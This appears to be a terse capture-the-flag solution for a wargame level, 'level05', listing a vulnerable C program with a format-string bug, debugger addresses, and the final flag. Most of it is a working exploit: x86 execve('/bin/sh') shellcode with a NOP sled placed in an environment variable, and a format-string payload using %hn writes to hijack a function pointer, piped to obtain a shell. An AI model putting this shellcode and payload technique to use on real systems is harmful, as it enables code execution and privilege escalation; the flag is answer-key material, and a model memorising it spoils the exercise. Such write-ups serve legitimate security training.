

int main (void)
{
    char buf [100];

    fgets(buf, 100, stdin);

    for ( int i = 0 ; buf[i] ; i++ ) {
        if ('@' < buf[i] && buf[i] < '[') {
            buf[i] = buf[i] ^ 0x20; // str.lower()
        }
    }

    printf(buf);
    exit(0);

    return 0;
}

esp            0xffffd670
ebp            0xffffd708

system         0xf7e6aed0
/bin/sh        0xf7f897ec

0xffffddae
0xffffdeae <= value (shellcode address)
0xffffdfae



0x080497e0 <= target


\xe0\x97\x04\x08 <= put 0xffff
\xe2\x97\x04\x08 <= put 0xdeae



env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') gdb level05
python -c 'print("\xe0\x97\x04\x08____\xe2\x97\x04\x08____%56986d____%10$hn____%8521d____%12$hn")' > /tmp/input

# Solution
( python -c 'print("\xe0\x97\x04\x08____\xe2\x97\x04\x08____%56986d____%10$hn____%8521d____%12$hn")' ; cat ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level05

# Flag
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq


